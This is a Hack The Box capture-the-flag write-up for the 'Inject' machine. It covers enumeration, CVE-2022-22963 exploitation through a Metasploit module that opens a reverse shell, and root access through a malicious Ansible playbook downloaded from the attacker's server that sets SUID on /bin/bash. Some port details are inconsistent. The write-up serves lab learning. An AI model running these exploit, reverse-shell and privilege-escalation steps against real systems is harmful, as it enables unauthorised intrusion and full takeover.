# Hack The Box — Inject (Write-Up)

**Difficulty**: Easy  
**Machine OS**: Linux  
**Category**: Web / Privilege Escalation  
**IP**: `10.129.xx.xxx` *(dynamic)*  
**Author**: [Your GitHub Name or Alias]

---

##  Overview

This write-up documents the full exploitation process for the *Inject* machine on [Hack The Box](https://hackthebox.com), including:

- Port scanning and service enumeration
- Web directory brute-forcing and upload analysis
- Discovery and exploitation of LFI and CVE-2022-22963 (Spring Cloud Function)
- Gaining initial shell via Metasploit
- Lateral movement from `frank` to another user
- Privilege escalation via misconfigured Ansible automation
- Access to both user and root flags

---

##  Initial Enumeration

Run a full port and version scan:

```bash
nmap -sC -sV -oA inject-scan 10.129.xx.xxx

Open Ports Found:
22/tcp — SSH
8080/tcp — HTTP Web Service , nagios-nsca Nagios NSCA

# Web Enumeration
Accessed http://10.129.xx.xxx:8000
Ran directory brute-force (e.g. with gobuster or ffuf)
Found an upload feature and discovered a Local File Inclusion (LFI) vulnerability
Investigated further and identified the application as vulnerable to CVE-2022-22963 — Spring Cloud Function RCE

Exploitation: Spring Cloud RCE (CVE-2022-22963)
Used Metasploit to exploit the vulnerable endpoint:
use exploit/multi/http/spring_cloud_function_spel_injection
set RHOSTS <target-ip>
set LHOST <your tun0 ip>
run

Successfully gained a reverse shell as the frank user
Lateral Movement
Enumerated the system as frank
Switched to another internal user phil 
Retrieved the user flag

Privilege Escalation (Ansible Misconfiguration)
Found automation scripts under /opt/automation/
Used a local Python HTTP server to upload a malicious Ansible playbook:

# On attacker machine
cd /path/to/pe.yml
python3 -m http.server 8000

# On target (as the intermediate user)
wget http://<your-ip>:8000/pe.yml

- hosts: localhost
  tasks:
    - name: Priv esc
      ansible.builtin.shell: |
        chmod +s /bin/bash
      become: true

pe.yml
bash -p
whoami  # => root

Root Access
With root privileges, captured the final flag
cat /root/root.txt




